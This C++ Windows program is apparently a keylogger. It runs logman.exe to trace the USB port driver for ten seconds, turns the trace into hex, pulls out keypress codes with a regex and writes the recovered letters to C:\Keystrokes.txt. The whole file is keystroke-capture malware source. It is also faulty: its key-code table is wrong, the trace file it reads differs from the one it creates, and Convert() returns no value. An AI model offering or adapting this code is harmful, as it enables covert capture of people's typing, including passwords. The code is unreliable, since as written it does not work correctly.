
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <cstdlib>
#include <iostream>
#include <string>
#include <fstream>
#include <iterator>
#include <regex>
#include <unordered_map>

using namespace std;

        
//Starting Logman
void StartApp(LPSTR cmd) 
//takes any command as string, add "DWORD Number" 
//to change timeout value below
{
    STARTUPINFO info;
    PROCESS_INFORMATION processInfo;
    ZeroMemory(&info, sizeof(info));
    info.cb= sizeof( info );
    ZeroMemory(&processInfo, sizeof(processInfo));
    info.dwFlags= STARTF_USESHOWWINDOW;
    info.wShowWindow= SW_SHOWNORMAL;
    
    CreateProcess(
            NULL, 
            cmd,
            NULL, 
            NULL,
            FALSE,
            0,
            NULL,
            NULL,
            &info,
            &processInfo
            );
   //This will make the program pause until the window is closed - 
   //time = DWORD $Number (or "INFINITE" in this case)
    WaitForSingleObject( processInfo.hProcess, INFINITE );
    CloseHandle( processInfo.hProcess );
    CloseHandle( processInfo.hThread );
}

//Translates binary generated by Logman into hex. 
 int LogToHex()
{

    unsigned char x;
    ifstream data("C:\\trace_000001.etl", ios::binary);
    ofstream out("C:\\Hex.txt");
    data >> noskipws;
    while(data >> x)
    {
        out << hex << (int)x;
    }
   

    return 0;
}
//Regex to pull out keystrokes. An unmodified keypress can be identified by 
//the string below, basically "8000000XX00", where XX is the HID code.
int LogParse()
{
    string line;
    ifstream inp;
    ofstream out;
    regex pattern("8000(.{2})00");
    
    inp.open("C:\\Hex.txt");
    out.open("C:\\Matches.txt");   
    if (inp.is_open())
    {
        while(inp.good())
        {
           
            getline(inp, line);         
            copy(sregex_token_iterator(line.begin(), line.end(), pattern, {1,2}),
            sregex_token_iterator(),
            ostream_iterator<string>(out, " "));
       
            
            
            
        }
    }
    inp.close();
    out.close();
    return 0;
}
//Converts HID -> standard characters
string Convert()
{
    static const std::unordered_map<int, char> keyvalues {
    { 0x40, 'A' },
    { 0x50, 'B' },
    { 0x60, 'C' },
    { 0x70, 'D' },
    { 0x80, 'E' },
    { 0x90, 'F' },    
    { 0xA0, 'G' },
    { 0xB0, 'H' },
    { 0xC0, 'I' },
    { 0xD0, 'J' },
    { 0xE0, 'K' },
    { 0xF0, 'L' },
    { 0x10, 'M' },
    { 0x11, 'N' },
    { 0x12, 'O' },   
    { 0x13, 'P' },
    { 0x14, 'Q' },
    { 0x15, 'R' },
    { 0x16, 'S' },
    { 0x17, 'T' },
    { 0x18, 'U' },
    { 0x19, 'V' },
    { 0x1A, 'W' },
    { 0x1B, 'X' },
    { 0x1C, 'Y' },
    { 0x1D, 'Z' }
    
};
    std::string result;
    ofstream out("C:\\Keystrokes.txt");
    ifstream inp("C:\\Matches.txt");
    string data;
    getline(inp, data);
    std::transform(std::istream_iterator<int> {istringstream { data } >> std::hex },
                   std::istream_iterator<int> { },
                   std::back_inserter(result),
                   [](int n) {try 
                   { return keyvalues.at(n); } 
                   catch (const out_of_range& oor){}});
    out << result;
}

int main()
{   
   
    StartApp("C://windows//system32//logman.exe create trace -n \"usbtrace\" -o \"C://trace.etl\" -nb \"128 640\" -bs \"128\"");
    StartApp("C://windows//system32//logman.exe update trace -n \"usbtrace\" -p \"microsoft-windows-usb-usbport\"");
    StartApp("C://windows//system32//logman.exe start -n usbtrace");
    Sleep(10000);
    StartApp("C://windows//system32//logman.exe stop -n usbtrace");
    StartApp("C://windows//system32//logman.exe delete -n usbtrace");
    
    LogToHex();
    LogParse();
    Convert();
   
}
